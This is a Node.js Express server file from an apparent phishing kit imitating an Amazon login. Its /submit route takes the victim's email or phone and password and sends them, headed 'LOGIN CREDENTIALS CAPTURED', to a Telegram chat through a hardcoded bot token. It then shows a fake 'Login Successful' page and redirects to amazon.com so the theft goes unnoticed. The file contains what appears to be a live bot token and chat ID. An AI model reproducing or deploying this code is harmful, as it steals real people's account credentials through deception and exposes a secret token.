const express = require('express');
const session = require('express-session');
const axios = require('axios');
const path = require('path');
const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7585548516:AAGRcY22KvqX3sme0cIf1b_NXkuF6aSJTA8';
const TELEGRAM_CHAT_ID = '-1002554104085';

// Function to send message to Telegram
async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
        });
    } catch (error) {
        console.error('Error sending to Telegram:', error.message);
    }
}

// Main route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

// Handle login submission
app.post('/submit', async (req, res) => {
    const { email_or_phone, password } = req.body;
    if (email_or_phone && password) {
        // Send data to Telegram
        const message = `🔐 <b>LOGIN CREDENTIALS CAPTURED</b> 🔐\n\n` +
            `📧 <b>Email/Phone:</b> ${email_or_phone}\n` +
            `🔑 <b>Password:</b> ${password}\n` +
            `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        await sendToTelegram(message);

        // Redirect to success page
        res.redirect('/success');
    } else {
        res.redirect('/');
    }
});

// Success page
app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login Success</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <h1 class="form-title">Login Successful</h1>
                <div>You have successfully logged in. You will be redirected to Amazon in 3 seconds.</div>
            </div>
            <script>
                setTimeout(() => {
                    window.location.href = 'https://www.amazon.com';
                }, 3000);
            </script>
        </body>
        </html>
    `);
});

module.exports = app;
